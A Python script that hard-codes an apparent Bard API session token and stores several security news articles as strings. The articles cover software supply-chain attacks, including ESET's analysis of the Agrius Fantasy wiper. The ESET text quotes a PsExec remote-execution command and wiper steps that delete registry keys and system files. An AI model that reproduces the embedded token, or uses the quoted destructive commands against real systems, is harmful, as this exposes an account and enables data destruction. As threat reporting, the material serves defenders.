# -*- coding: utf-8 -*-
# 01.simple usage
from bardapi import Bard
import os
import re
import random
import openpyxl


token='XwjfHs3RkyHper-1vgil-TDEBUcqd_nkc4BFKorxtI12aeW0GC36LtY0LFcU9QsCzCfBtg.'


article1 = "Published on None. The RubyGems package repository has fixed a critical vulnerability that would allow anyone to unpublish (yank) certain Ruby packages from the repository and republish their tainted or malicious versions with the same file names and version numbers.Assigned CVE-2022-29176, the critical flaw existed on RubyGems.org, which is the Ruby-equivalent of npmjs.com, and hosts over 170,000 Ruby packages (gems) with almost 100 billion downloads served over its lifetime.An initial audit from RubyGems reveals that the vulnerability has not been exploited within the last 18 months to alter any gems, but a deeper audit is still in progress with results yet to be announced.Hijacking a gem: yank, alter, republishThis week, RubyGems announced that a critical bug couldve enabled any RubyGems.org user to yank versions of a gem that they didnt have authorization for, and replace the gems contents with newer files.Similar to npm for NodeJS packages, RubyGems is a package manager for the Ruby programming language and provides a standardized format for distributing finished Ruby artifacts (called gems). The RubyGems.org registry is the communitys gem hosting service allowing developers to instantly publish or install gems and use a set of specialized APIs.Should a threat actor become aware of such a flaw, they could quietly replace the contents of legitimate Ruby packages with malware—something which has echoes of npms popular ua-parser-js, coa, and rc libraries that were hijacked last year to distribute crypto miners and password stealers.Although the npm hijacking incidents stemmed from maintainer account compromises rather than a vulnerability exploit, they wreaked havoc as libraries like ua-parser-js have been used by over a thousand projects, including those used by Facebook, Microsoft, Amazon, Instagram, Google, Slack, Mozilla, Discord, Elastic, Intuit, Reddit, and many more well-known companies.In Rubys case, mass exploitation of such an exploit could cause widespread damage to the Ruby ecosystem and overall software supply chain security.To exploit the vulnerability, RubyGems explains, the following conditions need to be met:The gem being targeted has one or more dashes in its name, e.g. something-provider.The word that comes before the first dash represents an attacker-controlled gem that exists on RubyGems.org.The gem being yanked/altered was either created within the past 30 days or had not been updated in over 100 days.For example, the gem something-provider could have been taken over by the owner of the gem something, explains RubyGems.Organizations with many gems were not vulnerable as long as they owned the gem with the name before the dash, for example owning the gem orgname protected all gems with names like orgname-provider.This vulnerability, assigned CVE-2022-29176, lurked in the yank action of RubyGems code and has now been fixed.Independent developer and pentester, Greg Molnar has explained the flaw in a little more technical depth.At this time, RubyGems.org maintainers do not believe the vulnerability has been exploited, according to the results of an audit that analyzed gem changes made over the last 18 months on the platform.But the registry owners state that a deeper audit is ongoing and its results will follow in the security advisory published for this vulnerability, which also contains some mitigations.RubyGems.org sends an email to all gem owners when a gem version is published or yanked. We have not received any support emails from gem owners indicating that their gem has been yanked without authorization, states the advisory.RubyGem developers can audit their application history for possible past exploits by reviewing their Gemfile.lock and searching for gems that had their platform changed with version numbers remaining unchanged.For example, seeing your gemname-3.1.2 gem renamed to gemname-3.1.2-java is one possible sign of the vulnerability having been exploited.User laursisask has been credited with reporting the vulnerability via HackerOne.Updates:May 8th, 5:17 PM ET: Added information on how to check if your gem has been exploited via this flaw.May 8th, 5:35 PM ET: Added link to Molnars technical analysis of the flaw."
article2 = "Published on 2022-12-07 00:00:00. ESET researchers analyzed a supply-chain attack abusing an Israeli software developer to deploy Fantasy, Agriuss new wiper, with victims including the diamond industryESET researchers discovered a new wiper and its execution tool, both attributed to the Agrius APT group, while analyzing a supply-chain attack abusing an Israeli software developer. The group is known for its destructive operations.In February 2022, Agrius began targeting Israeli HR and IT consulting firms, and users of an Israeli software suite used in the diamond industry. We believe that Agrius operators conducted a supply-chain attack abusing the Israeli software developer to deploy their new wiper, Fantasy, and a new lateral movement and Fantasy execution tool, Sandals.The Fantasy wiper is built on the foundations of the previously reported Apostle wiper but does not attempt to masquerade as ransomware, as Apostle originally did. Instead, it goes right to work wiping data. Victims were observed in South Africa – where reconnaissance began several weeks before Fantasy was deployed – Israel, and Hong Kong.Group overviewAgrius is a newer Iran-aligned group targeting victims in Israel and the United Arab Emirates since 2020. The group initially deployed a wiper, Apostle, disguised as ransomware, but later modified Apostle into fully fledged ransomware. Agrius exploits known vulnerabilities in internet-facing applications to install webshells, then conducts internal reconnaissance before moving laterally and then deploying its malicious payloads.Campaign overviewOn February 20th, 2022 at an organization in the diamond industry in South Africa, Agrius deployed credential harvesting tools, probably in preparation for this campaign. Then, on March 12th, 2022, Agrius launched the wiping attack by deploying Fantasy and Sandals, first to the victim in South Africa and then to victims in Israel and lastly to a victim in Hong Kong.Victims in Israel include an IT support services company, a diamond wholesaler, and an HR consulting firm. South African victims are from a single organization in the diamond industry, with the Hong Kong victim being a jeweler.The campaign lasted less than three hours and within that timeframe ESET customers were already protected with detections identifying Fantasy as a wiper, and blocking its execution. We observed the software developer pushing out clean updates within a matter of hours of the attack. We reached out to the software developer to notify them about a potential compromise, but our enquiries went unanswered.Preparing for departureThe first tools deployed by Agrius operators to victim systems, through means unknown, were:MiniDump, a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumpsSecretsDump, a Python script that performs various techniques to dump hashes from [a] remote machine without executing any agent thereHost2IP, a custom C#/.NET tool that resolves a hostname to an IP address.Usernames, passwords, and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper. Agrius operators deployed MiniDump and SecretsDump to this campaigns first victim on February 20th, 2022, but waited until March 12th, 2022 to deploy Host2IP, Fantasy, and Sandals (consecutively).Sandals: Igniting the Fantasy (wiper)Sandals is a 32-bit Windows executable written in C#/.NET. We chose the name because Sandals is an anagram of some of the command line arguments it accepts. It is used to connect to systems in the same network via SMB, to write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string:PsExec.exe /accepteula -d -u <username> -p <password> -s C:\<path>\<GUID>.batThe PsExec options have the following meanings:-d – Dont wait for process to terminate (non-interactive).– Dont wait for process to terminate (non-interactive). /accepteula – Suppress display of the license dialog.– Suppress display of the license dialog. -s – Run the remote process in the SYSTEM account.Sandals does not write the Fantasy wiper to remote systems. We believe that the Fantasy wiper is deployed via a supply-chain attack using the software developers software update mechanism. This assessment is based on several factors:all victims were customers of the affected software developer;the Fantasy wiper was named in a similar fashion to legitimate versions of the software;all victims executed the Fantasy wiper within a 2.5 hour timeframe, where victims in South Africa were targeted first, then victims in Israel, and finally victims in Hong Kong (we attribute the delay in targeting to time zone differences and a hardcoded check-in time within the legitimate software); and,lastly, the Fantasy wiper was written to, and executed from, %SYSTEM%\Windows\Temp , the default temp directory for Windows systems.Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims machines, and for ease of batch file execution. Table 1 lists the command line arguments accepted by Sandals.Table 1. Sandals arguments and their descriptionsArgument Description Required -f <filepath> A path and filename to a file that contains a list of hostnames that should be targeted. Yes -u <username> The username that will be used to log into the remote hostname(s) in argument -f . Yes -p <password> The username that will be used to log into the remote hostname(s) in argument -f . Yes -l <filepath> The path and filename of the Fantasy wiper on the remote system that will be executed by the batch file created by Sandals. Yes -d <path> The location to which Sandals will write the batch file on the remote system. Default location is %WINDOWS%\Temp . No -s <integer> The amount of time, in seconds, that Sandals will sleep between writing the batch file to disk and executing. The default is two seconds. No -a file <filepath> or-a random or-a rsa If -a is followed by the word file and a path and filename, Sandals uses the encryption key in the supplied file. If -a is followed by rsa or random , Sandals uses the RSACryptoServiceProvider class to generate a public-private key pair with a key size of 2,048.No -dn <devicename> Specifies which drive to connect with on a remote system over SMB. Default is C: . No -ps <filepath> Location of PsExec on disk. Default is psexec.exe in the current working directory. No -ra If -ra is supplied at runtime, it sets the variable flag to True (initially set to False ). If flag=True , Sandals deletes all files written to disk in the current working directory. If flag=False , Sandals skips the file cleanup step. NoThe batch file written to disk by Sandals is named <GUID>.bat, where the filename is the output of the Guid.NewGuid() method. An example of a Sandals batch file is shown in Figure 2.The base64 string that follows fantasy35.exe is likely a relic of the execution requirements of Apostle (more details in the Attribution to Agrius section). However, the Fantasy wiper only looks for an argument of 411 and ignores all other runtime input (see the next section for more information).Fantasy wiperThe Fantasy wiper is also a 32-bit Windows executable written in C#/.NET, so named for its filenames: fantasy45.exe and fantasy35.exe, respectively. Figure 3 depicts the execution flow of the Fantasy wiper.Initially, Fantasy creates a mutex to ensure that only one instance is running. It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists. Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.GetBytes method to create a cryptographically strong sequence of random values in a 4096-byte array. If a runtime argument of 411 is supplied to the wiper, the for loop overwrites the contents of every file with the aforementioned byte array using a nested while loop. Otherwise, the for loop only overwrites files with a file extension listed in the Appendix.Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties:CreationTimeLastAccessTimeLastWriteTimeCreationTimeUtcSetLastAccessTimeUtcLastWriteTimeUtcand then deletes the file. This is presumably done to make recovery and forensic analysis more difficult.During the for loop, the Fantasy wiper counts errors within the current directory when attempting to overwrite files. If the number of errors exceeds 50, it writes a batch file, %WINDOWS%\Temp\<GUID>.bat, that deletes the directory with the files causing the errors, and then self-deletes. File wiping then resumes in the next directory in the target list.Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\Temp called registry.bat. The batch file deletes the following registry keys:HKCR\.EXEHKCR\.dllHKCR\*Then it runs the following to attempt to clear file system cache memory:%windir%\system32\rundll32.exe advapi32.dll,ProcessIdleTasksLastly, registry.bat deletes itself (del %0).Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes. Then Fantasy sleeps for two minutes before overwriting the systems Master Boot Record.Fantasy then writes another batch file, %WINDOWS%\Temp\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself. Then Fantasy wiper sleeps for 30 seconds before rebooting the system with reason code SHTDN_REASON_MAJOR_OTHER (0x00000000) — Other issue.It is likely that %SYSTEMDRIVE% recovery is possible. Victims were observed to be back up and running within a matter of hours.Attribution to AgriusMuch of the code base from Apostle, initially a wiper masquerading as ransomware then updated to actual ransomware, was directly copied to Fantasy and many other functions in Fantasy were only slightly modified from Apostle, a known Agrius tool. However, the overall functionality of Fantasy is that of a wiper without any attempt to masquerade as ransomware. Figure 4 shows the file deletion functions in Fantasy and Apostle, respectively. There are only a few small tweaks between the original function in Apostle and the Fantasy implementation.Figure 4. File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green)Figure 5 shows that the directory listing function is almost a direct copy, with only the function variables getting a slight tweak between Apostle and Fantasy.Finally, the GetSubDirectoryFileListRecursive function in Figure 6 is also almost an exact copy.In addition to the code reuse, we can see remnants of the Apostle execution flow in Fantasy. In the original analysis of Apostle, SentinelOne notes that Proper execution of the ransomware version requires supplying it with a base64 encoded argument containing an XML of an RSAParameters object. This argument is passed on and saved as the Public Key used for the encryption process and is most likely generated on a machine owned by the threat actor. We can see in the batch file in Figure 7, which Sandals creates on remote systems to launch Fantasy, that the same base64-encoded argument containing an XML of an RSAParameters object is passed to Fantasy at runtime. Fantasy, however, does not use this runtime argument.ConclusionSince its discovery in 2021, Agrius has been solely focused on destructive operations. To that end, Agrius operators probably executed a supply-chain attack by targeting an Israeli software companys software updating mechanisms to deploy Fantasy, its newest wiper, to victims in Israel, Hong Kong, and South Africa. Fantasy is similar in many respects to the previous Agrius wiper, Apostle, that initially masqueraded as ransomware before being rewritten to be actual ransomware. Fantasy makes no effort to disguise itself as ransomware. Agrius operators used a new tool, Sandals, to connect remotely to systems and execute Fantasy.IoCsSHA-1 Filename Detection Description 1A62031BBB2C3F55D44F59917FD32E4ED2041224 fantasy35.exe MSIL/KillDisk.I Fantasy wiper. 820AD7E30B4C54692D07B29361AECD0BB14DF3BE fantasy45.exe MSIL/KillDisk.I Fantasy wiper. 1AAE62ACEE3C04A6728F9EDC3756FABD6E342252 host2ip.exe clean Resolves a hostname to an IP address. 5485C627922A71B04D4C78FBC25985CDB163313B MiniDump.exe MSIL/Riskware.LsassDumper.H Implementation of Mimikatz minidump that dumps credentials from LSASS. DB11CBFFE30E0094D6DE48259C5A919C1EB57108 registry.bat BAT/Agent.NRG Batch file that wipes some registry keys and is dropped and executed by the Fantasy wiper. 3228E6BC8C738781176E65EBBC0EB52020A44866 secretsdump.py Python/Impacket.A Python script that dumps credential hashes. B3B1EDD6B80AF0CDADADD1EE1448056E6E1B3274 spchost.exe MSIL/Agent.XH Sandals lateral movement tool and Fantasy spreader.MITRE ATT&CK techniquesThis table was built using version 12 of the MITRE ATT&CK framework.Tactic ID Name Description Resource Development T1587 Develop Capabilities Agrius builds utility tools to use during an active exploitation process. T1587.001 Develop Capabilities: Malware Agrius builds custom malware including wipers (Fantasy) and lateral movement tools (Sandals). Initial Access T1078.002 Valid Accounts: Domain Accounts Agrius operators attempted to capture cached credentials and then use them for lateral movement. T1078.003 Valid Accounts: Local Accounts Agrius operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network. Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell Fantasy and Sandals both use batch files that run via the Windows command shell. Privilege Escalation T1134 Access Token Manipulation Fantasy uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs in advapi32.dll to grant its process token the SeShutdownPrivilege to reboot Windows. Defense Evasion T1070.006 Indicator Removal on Host: Timestomp Agrius operators timestomped the compilation timestamps of Fantasy and Sandals. Credential Access T1003 OS Credential Dumping Agrius operators used several tools to dump OS credentials for use in lateral movement. Discovery T1135 Network Share Discovery Agrius operators used cached credentials to check for access to other systems within an internal network. Lateral Movement T1021.002 Remote Services: SMB/Windows Admin Shares Agrius operators used cached credentials to connect over SMB to systems within an exploited internal network. T1570 Lateral Tool Transfer Agrius operators used Sandals to push batch files over SMB to other systems within an internal network. Impact T1485 Data Destruction The Fantasy wiper overwrites data in files and then deletes the files. T1561.002 Disk Wipe Fantasy wipes the MBR of the Windows drive and attempts to wipe the OS partition. T1561.001 Disk Wipe: Disk Content Wipe Fantasy wipes all disk contents from non-Windows drives that are fixed drives. T1529 System Shutdown/Reboot Fantasy reboots the system after completing its disk and data wiping payloads.AppendixFile extensions (682) targeted by Fantasy wiper when not targeting all file extensions. File extensions highlighted in yellow (68) are common filename extensions in Windows. Notably absent are file extensions dll and sys.$$$ blend drw jsp nyf qualsoftcode tdb $db blend1 dsb kb2 oab quicken2015backup tex 001 blend2 dss kbx obj quicken2016backup tga 002 blob dtd kc2 obk quicken2017backup thm 003 bm3 dwg kdb odb quickenbackup tib 113 bmk dxb kdbx odc qv~ tibkp 3dm bookexport dxf kdc odf r3d tif 3ds bpa dxg key odg raf tig 3fr bpb em1 kf odm rar tis 3g2 bpm epk kpdx odp rat tlg 3gp bpn eps layout ods raw tmp 3pr bps erbsql lbf odt rb tmr 73b bpw erf lcb oeb rbc tor 7z bsa esm ldabak ogg rbf trn __a bup exe litemod oil rbk ttbk __b c exf llx old rbs txt ab caa fbc lnk onepkg rdb uci ab4 cas fbf ltx orf re4 upk aba cbk fbk lua ori rgss3a v2i abbu cbs fbu lvl orig rim vb abf cbu fbw m ost rm vbk abk cdf fdb m2 otg rmbak vbm abu cdr ff m3u oth rmgb vbox-prev abu1 cdr3 ffd m4a otp rofl vcf accdb cdr4 fff m4v ots rrr vdf accde cdr5 fh map ott rtf vfs0 accdr cdr6 fhd max oyx rw2 vmdk accdt cdrw fhf mbf p12 rwl vob ach cdx fla mbk p7b rwz vpcbackup acp ce2 flat mbw p7c s3db vpk acr cel flka mcmeta pab safenotebackup vpp_pc act cenon~ flkb mdb pages sas7bdat vrb adb cer flv mdbackup pak sav vtf adi cfp fmb mdc paq say w01 ads cfr forge mddata pas sb w3x aea cgm fos mdf pat sbb wallet afi cib fpk mdinfo pba sbs walletx agdl ck9 fpsx mef pbb sbu war ai class fpx mem pbd sdO wav ait cls fsh menu pbf sda wb2 al cmf ftmb mfw pbj sdc wbb apj cmt ful mig pbl sdf wbcat apk config fwbackup mkv pbx5script sid wbk arc cpi fxg mlx pbxscript sidd wbx arch00 cpp fza mmw pcd sidn win arw cr2 fzb moneywell pct sie wjf as4 craw gb1 mos pdb sim wma asd crds gb2 mov pdd sis wmo asf crt gbp mp3 pdf skb wmv ashbak crw gdb mp4 pef sldm wotreplay asm cs gho mpb pem sldx wpb asmx csd ghs mpeg pfi slm wpd asp csh gray mpg pfx sln wps aspx csl grey mpqge php sme wspak asset csm gry mrw php5 sn1 wxwanam asv css gs-bck mrwref phtml sn2 x asvx csv gz msg pk7 sna x11 asx d3dbsp h msi pkpass sns x3f ate da0 hbk msim pl snx xbk ati dac hkdb mv_ plc spf xf avi das hkx myd plc spg xis awg dash hplg mynotesbackup png spi xla ba6 dazip hpp nb7 pot sps xlam ba7 db htm nba potm sqb xlk ba8 db-journal htm1 nbak potx sql xlm ba9 db0 html nbd ppam sqlite xlr bac db3 hvpl nbd pps sqlite3 xls back dba ibank nbf ppsm sqlitedb xlsb backup dbf ibd nbi ppsx sr2 xlsm backup1 dbk ibk nbk ppt srf xlsx backupdb dbs ibz nbs pptm srr xlt bak dbx icbu nbu pptx srt xltm bak2 dc2 icf ncf pqb-backup srw xltx bak3 dcr icxs nco prf st4 xlw bakx dcs idx nd prv st6 xml bak~ ddd iif nda ps st7 ycbcra bank ddoc iiq ndd psa st8 yrcbck bar ddrw incpas nef psafe3 std yuv bat dds indd nfb psd stg zbfx bay der index nfc psk sti zip bbb des inprogress nk2 pspimage stw ztmp bbz desc ipd nop pst stx ~cw bc6 design iso noy ptb sty bc7 dgc itdb npf ptx sum bck dim itl nps pvc sv$ bckp divx itm nrbak pvhd sv2i bcm diy iv2i nrs py svg bdb djvu iwd nrw qba swf bff dmp iwi ns2 qbb sxc bgt dna j01 ns3 qbk sxd bif dng jar ns4 qbm sxg bifx doc java nsd qbmb sxi big docm jbk nsf qbmd sxm bik docx jdc nsg qbr sxw bk1 dot jpa nsh qbw syncdb bkc dotm jpe ntl qbx t12 bkf dotx jpeg nwb qby t13 bkp dov jpg nwbak qdf tar bkup dpb jps nx2 qic tax bkz drf js nxl qsf tbkSign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center Submit"
article3 = "Published on None. Over 1,600 publicly available Docker Hub images hide malicious behavior, including cryptocurrency miners, embedded secrets that can be used as backdoors, DNS hijackers, and website redirectors.Docker Hub is a cloud-based container library allowing people to freely search and download Docker images or upload their creations to the public library or personal repositories.Docker images are templates for the quick and easy creation of containers that contain ready-to-use code and applications. Therefore, those looking to set up new instances often turn to Docker Hub to quickly find an easily deployable application.Unfortunately, due to abuse of the service by threat actors, over a thousand malicious uploads introduce severe risks to unsuspecting users deploying malware-laden images on locally hosted or cloud-based containers.Many malicious images use names that disguise them as popular and trustworthy projects, so threat actors clearly uploaded them to trick users into downloading them.Researchers at Sysdig looked into the issue, trying to evaluate the scale of the problem, and reported on the found images that feature some form of malicious code or mechanism.Docker Hub trapsApart from images reviewed by the Docker Library Project, which are verified to be trustworthy, hundreds of thousands of images with an unknown status are on the service.Sysdig used its automated scanners to scrutinize 250,000 unverified Linux images and identified 1,652 of them as malicious.Types of malicious images on Docker Hub (Sysdig)The largest category was that of crypto-miners, found in 608 container images, targeting server resources to mine cryptocurrency for the threat actors.The second most-common occurrence were images hiding embedded secrets, measuring 281 cases. The secrets embedded in these images are SSH keys, AWS credentials, GitHub tokens, NPM tokens, and others.Types of secrets left in Docker images (Sysdig)Sysdig comments that these secrets may have been left on public images by mistake or intentionally injected by the threat actor who created and uploaded them.By embedding an SSH key or an API key into the container, the attacker can gain access once the container is deployed, warns Sysdig in the report.For instance, uploading a public key to a remote server allows the owners of the corresponding private key to open a shell and run commands via SSH, similar to implanting a backdoor.Many malicious images discovered by Sysdig used typosquatting to impersonate legitimate and trusted images, only to infect users with crypto-miners.This tactic lays the ground for some highly successful cases, like the two examples shown below, that have been downloaded almost 17,000 times.Docker images containing coinminers (Sysdig)Typosquatting also ensures that users mistyping the name of a popular project will download a malicious image, so while this doesnt produce large victim counts, it still ensures a steady stream of infections.Typosquatted images capturing random mistypes (Sysdig)A worsening problemSysdig says that in 2022, 61% of all images pulled from Docker Hub come from public repositories, a 15% rise from 2021 stats, so the risk for users is on the rise.Unfortunately, the size of the Docker Hub public library does not allow its operators to scrutinize all uploads daily; hence many malicious images go unreported.Sysdig also noticed that most threat actors only upload a couple of malicious images, so even if a risky image is removed and the uploader is banned, it doesnt significantly impact the platforms threat landscape."
article4 = "Published on 2022-10-03 15:03:16+00:00. CrowdStrike is warning of a recently identified supply chain attack involving Canada-based customer engagement software provider Comm100.As part of the attack, a trojanized Comm100 Live Chat installer signed with a valid Comm100 Network Corporation certificate on September 26 was distributed from the companys website from at least September 27 until September 29, 2022. The vendor claims to have more than 15,000 customers across 51 countries.The trojanized file was identified at organizations in the industrial, healthcare, technology, manufacturing, insurance and telecommunications sectors in North America and Europe, CrowdStike says.The Comm100 installer is an Electron application in which the attackers injected a JavaScript backdoor, within the main.js file of the embedded archive. When executed, the backdoor fetches and runs a second-stage script from an external resource.The scripts obfuscated code contains a backdoor to harvest system information and to provide the attackers with remote shell functionality.At the next stage, the attacker deployed additional payloads onto the compromised hosts, including a malicious loader DLL that decrypts and executes in memory a shellcode that injects an embedded payload into a new instance of notepad.exe.CrowdStrike believes that the attack is the work of a China nexus threat actor that previously targeted various online gambling entities in Asia, despite differences in the delivered payload, in the target scope and the supply chain attack mechanism.Advertisement. Scroll to continue reading.Despite these differences, CrowdStrike Intelligence assesses that the actor responsible for previously identified online gambling targeting is also likely responsible for these recent incidents, the cybersecurity firm says.An updated Comm100 installer has been released to remove the malicious code and all Comm100 customers are advised to download and install the latest version of the application.Comm100 appears to be investigating the incident, but has not shared any information on the attack. SecurityWeek has emailed the company for clarification on the incident and will update the article as soon as a reply arrives.Related: Chinese Cyberspies Use Supply Chain Attack to Deliver Windows, macOS MalwareRelated: The Vulnerable Maritime Supply Chain – a Threat to the Global EconomyRelated: Software Supply Chain Attacks Tripled in 2021: Study"
article5 = "Published on None. Dropbox disclosed a security breach after threat actors stole 130 code repositories after gaining access to one of its GitHub accounts using employee credentials stolen in a phishing attack.The company discovered the attackers breached the account on October 14 when GitHub notified it of suspicious activity that started one day before the alert was sent.To date, our investigation has found that the code accessed by this threat actor contained some credentials—primarily, API keys—used by Dropbox developers, Dropbox revealed on Tuesday.The code and the data around it also included a few thousand names and email addresses belonging to Dropbox employees, current and past customers, sales leads, and vendors (for context, Dropbox has more than 700 million registered users).The successful breach resulted from a phishing attack that targeted multiple Dropbox employees using emails impersonating the CircleCI continuous integration and delivery platform and redirecting them to a phishing landing page where they were asked to enter their GitHub username and password.On the same phishing page, the employees were also asked to use their hardware authentication key to pass a One Time Password (OTP).Phishing email impersonating CircleCI (BleepingComputer)130 code repositories were stolen during the breachAfter stealing the Dropboxers credentials, the attackers gained access to one of Dropboxs GitHub organizations and stole 130 of its code repositories.These repositories included our own copies of third-party libraries slightly modified for use by Dropbox, internal prototypes, and some tools and configuration files used by the security team, the company added.Importantly, they did not include code for our core apps or infrastructure. Access to those repositories is even more limited and strictly controlled.Dropbox added that the attackers never had access to customers accounts, passwords, or payment information, and its core apps and infrastructure were not affected as a result of this breach.In response to the incident, Dropbox is working on securing its entire environment using WebAuthn and hardware tokens or biometric factors.In September, other GitHub users were also targeted in a similar attack impersonating the CircleCI platform and asking them to sign into their GitHub accounts to accept user terms and privacy policy updates to keep using the service.While GitHub itself was not affected, the campaign has impacted many victim organizations, GitHub said in an advisory at the time.GitHub said it detected content exfiltration from private repositories almost immediately after the compromise, with the threat actors using VPN or proxy services to make tracing them more difficult."
article6 = "Published on 2022-10-09 16:24:56+00:00. We recently broke the news that Intels Alder Lake BIOS source code had been leaked to 4chan and Github, with the 6GB file containing tools and code for building and optimizing BIOS/UEFI images. We reported the leak within hours of the initial occurrence, so we didnt yet have confirmation from Intel that the leak was genuine. Intel has now issued a statement to Toms Hardware confirming the incident:Our proprietary UEFI code appears to have been leaked by a third party. We do not believe this exposes any new security vulnerabilities as we do not rely on obfuscation of information as a security measure. This code is covered under our bug bounty program within the Project Circuit Breaker campaign, and we encourage any researchers who may identify potential vulnerabilities to bring them our attention through this program. We are reaching out to both customers and the security research community to keep them informed of this situation. — Intel spokesperson.The BIOS/UEFI of a computer initializes the hardware before the operating system has loaded. Among its many responsibilities, the BIOS establishes connections to certain security mechanisms, like the TPM (Trusted Platform Module). Now that the BIOS/UEFI code is in the wild and Intel has confirmed it as legitimate, both nefarious actors and security researchers alike will undoubtedly probe it to search for potential backdoors and security vulnerabilities.In fact, famed security researcher Mark Ermolov has already been hard at work analyzing the code. His early reports indicate that he has found secret MSRs (Model Specific Registers) that are typically reserved for privileged code and thus can present a security problem, along with the private signing key used for Intels Boot Guard, thus potentially invalidating the feature. In addition, there are also signs of ACMs (Authenticated Code Modules) for BootGuard and TXT (Trusted Execution Technology), portending potential future issues with the root of trust.I cant believe: NDA-ed MSRs, for the newest CPU, what a good day... pic.twitter.com/bNitVJlkkLOctober 8, 2022 See moreThe impact and breadth of discoveries could be limited, though. Most motherboard vendors and OEMs would have similar tools and information available to build firmware for Intel platforms. Moreover, Intels statement that it doesnt rely upon information obfuscation as a security measure means it has likely scrubbed the most overly-sensitive material before releasing it to external vendors.Intel is being proactive, though, and encouraging researchers to submit any vulnerabilities they find to its Project Circuit Breaker bug bounty program, which awards between $500 to $100,000 per bug, depending on the reported issues severity. Its unclear if the code can indirectly benefit open-source groups like Coreboot.Intel hasnt confirmed who leaked the code or where and how it was exfiltrated. However, we do know that the GitHub repository, now taken down but already replicated widely, was created by an apparent LC Future Center employee, a China-based ODM that manufactures laptops for several OEMs, including Lenovo. Additionally, one of the leaked documents refers to Lenovo Feature Tag Test Information, furthering the theories of the link between the company and the leak. There are also a plethora of files labeled Insyde, referring to Insyde Software, a company that provides BIOS/UEFI firmware to OEMs and is known to work with Lenovo.We arent aware of any attempts at ransom yet, but Intel or the affected parties might not have made those attempts public. Conversely, this could simply be the case of an employee inadvertently posting the source code to a public repository.However, recent hacks have targeted outside vendors to indirectly steal information from semiconductor manufacturers, thus enabling ransom attempts, and this leak could follow that model. A spate of recent attacks includes an attempt by RansomHouse to extort AMD after it obtained 56GB of data. AMD partner Gigabyte also had 112 GB of sensitive data stolen in the infamous Gigabyte Hack, but AMD refused to pay the ransom for the latter hack. As a result, information about AMDs forthcoming Zen 4 processors was divulged before launch, which later proved genuine.Nvidia also suffered a recent attack that resulted in the theft of 1TB of its data, but the GPU-making giant retaliated with its own operations to render the stolen data useless.Well update this article if any new details emerge."
article7 = "Published on None. IntroductionAfter we released our research that allowed us to take over any package hosted on Packagist, the main repository used by Composer, we decided to review its counterpart named PEAR. Its use slowly decreased in favor of Composer, but it is still an integral part of the PHP ecosystem used by many companies.For the second time in a year, we identified critical code vulnerabilities in a central component of the PHP supply chain. We believe these vulnerabilities could have been easily identified and exploited by threat actors with only minimal technical expertise, causing important disruption and security breaches across the world.We already discussed the SolarWinds case, but numerous non-targeted attacks have made the news since. A recent report by the European Union Agency For CyberSecurity (ENISA) studied 24 attacks reported between January 2021 and early July 2021 and highlighted that 50% of these attacks came from known threat actors and predicted a four-fold increase in 2021 as ransomware groups are joining the trend.The impact of such attacks on developer tools such as PEAR is even more significant as they are likely to run it on their computers before deploying it on production servers, creating an opportunity for attackers to pivot into companies internal networks.It is estimated that around 285 million packages have ever been downloaded from pear.php.net, the most popular ones being the PEAR client itself, Console_Getopt , Archive_Tar, and Mail . While Composer has a larger market share, these PEAR packages still get several thousand downloads per month.In this article we present two bugs, both exploitable for more than 15 years. An attacker exploiting the first one could take over any developer account and publish malicious releases, while the second bug would allow the attacker to gain persistent access to the central PEAR server.Before diving into the technical details, check out our video showing the various stages leading to arbitrary code execution on our local PEAR instance:Technical DetailsIn this section, we will cover the technical specificities of these two bugs, describe their root cause and how they can be exploited in a real-world scenario. We performed all our tests on a local virtual machine to avoid disrupting the official PEAR instance and used the official Git repository at commit f3333c2.The source code behind pear.php.net can be found on GitHub, in a project named pearweb . Our findings affect all pearweb instances before 1.32, version in which the maintainers fixed the vulnerabilities we discovered.The role of this software is to provide a bridge between the name of a package (e.g., Console_Getopt ) and the absolute URL where to download it from (e.g., http://download.pear.php.net/package/Console_Getopt-1.4.3.tgz). Its compromise would allow changing this association and force package managers to download packages from unintended sources under the attackers control.Initial Foothold: Weak Entropy during Password Resetpearweb instances do not allow self-registration: accounts are reserved to developers willing to propose packages for inclusion in the official PEAR repository. Requesting accounts can be done with the Request Account form, where the requester has to provide information about their identity and the project they want to distribute. Requests are then manually validated by PEAR administrators.This is an interesting choice to reduce abuse and to minimize the attack surface of the service: excluding the bug tracker, the only interesting features available without an account are this account request form, the authentication and the password reset functionality.After scanning this project on SonarCloud, our engine identified a Security Hotspot in a method named resetPassword():This code generates a random value, hash it with MD5 and then inserts it in the database along with other details required for the password reset. The use of MD5 is not a problem here, as long the hashed value is strong enough and unique.The problem is explained in great detail in the SonarCloud rule description: mt_rand() should not be used for security-sensitive reasons. Lets review the values concatenated together and then hashed with md5() :mt_rand(4,13) : an integer between 4 and 13 (inclusive bounds);: an integer between and (inclusive bounds); $user : the username of the account to reset, known and controlled by the attacker;: the username of the account to reset, known and controlled by the attacker; time() : the current timestamp;: the current timestamp; $pass1 : the new password to use, known and controlled by the attacker.From the attackers point of view, the final value is only based on two unknowns, which are the output of mt_rand() and time() : the first one cannot yield many values (10), and the second one can easily be approximated by the attacker. In addition, the HTTP server of pear.php.net adds a Date header to its responses, narrowing it down to only a few values (< 5).We could conclude that attackers can discover a valid password reset token in less than 50 tries, and we developed a script to exploit this weakness and confirm its impact: this is the first step of the introduction video.For the anecdote, this bug was introduced in March 2007 when first implementing this feature.By using this exploit against existing developer or administrator accounts, attackers could publish new releases of existing packages after including malicious code in them. It would then be automatically downloaded and executed every time somebody fetches these packages from PEAR.Gaining 